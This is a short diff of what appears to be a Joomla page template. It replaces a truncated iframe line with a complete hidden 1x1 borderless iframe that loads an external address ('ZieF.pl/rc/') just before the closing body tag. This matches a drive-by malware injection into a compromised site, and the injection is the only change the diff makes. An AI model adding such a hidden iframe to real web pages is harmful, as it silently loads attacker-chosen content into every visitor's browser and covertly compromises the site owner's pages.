@@ -20,4 +20,6 @@ defined( '_JEXEC' ) or die( 'Restricted access' );
 <body class="contentpane">
 	<jdoc:include type="message" />
 	<jdoc:include type="component" />
-<iframe src="ht
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
